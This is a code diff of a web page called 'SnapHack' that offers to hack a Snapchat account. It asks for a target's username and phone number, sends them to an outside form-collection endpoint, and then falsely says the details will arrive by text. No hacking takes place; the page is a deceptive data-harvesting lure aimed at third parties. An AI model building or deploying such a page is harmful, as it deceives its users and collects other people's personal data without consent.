@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>SnapHack</title>
   <style>
     body {
@@ -10,14 +11,28 @@
       text-align: center;
       padding: 40px;
     }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 20px;
+    }
+    form, #confirmation {
+      background-color: #111;
+      padding: 20px;
+      border-radius: 10px;
+      display: inline-block;
+    }
     input, button {
+      display: block;
+      width: 250px;
+      margin: 15px auto;
       padding: 10px;
-      margin: 10px;
+      font-size: 1em;
       border: none;
       border-radius: 5px;
     }
     input {
-      width: 250px;
+      background-color: #222;
+      color: white;
     }
     button {
       background-color: red;
@@ -33,24 +48,40 @@
 <body>
 
   <h1>SnapHack</h1>
-  <p>Enter the info to begin</p>
+  <p>Enter the target info to begin.</p>
 
-  <form action="https://formspree.io/f/xrbpvblo" method="POST" onsubmit="showMessage(); return true;">
-    <input type="text" name="snapchat_username" placeholder="Snapchat Username" required><br>
-    <input type="text" name="phone_number" placeholder="Phone Number" required><br>
+  <form id="hackForm">
+    <input type="text" name="snapchat_username" placeholder="Snapchat Username" required>
+    <input type="text" name="phone_number" placeholder="Phone Number" required>
     <button type="submit">Start</button>
   </form>
 
   <div id="confirmation">
-    <h2>Thanks!</h2>
-    <p>Info will be sent in a text when complete.</p>
+    <h2>Info is being processed...</h2>
+    <p>You will receive a text with the details once complete.</p>
   </div>
 
   <script>
-    function showMessage() {
-      document.querySelector('form').style.display = 'none';
-      document.getElementById('confirmation').style.display = 'block';
-    }
+    const form = document.getElementById('hackForm');
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent the page from refreshing
+
+      const formData = new FormData(form);
+
+      fetch("https://formspree.io/f/xyzeazor", {
+        method: "POST",
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        form.style.display = 'none';
+        document.getElementById('confirmation').style.display = 'block';
+      }).catch(error => {
+        alert("Something went wrong.");
+        console.error(error);
+      });
+    });
   </script>
 
 </body>
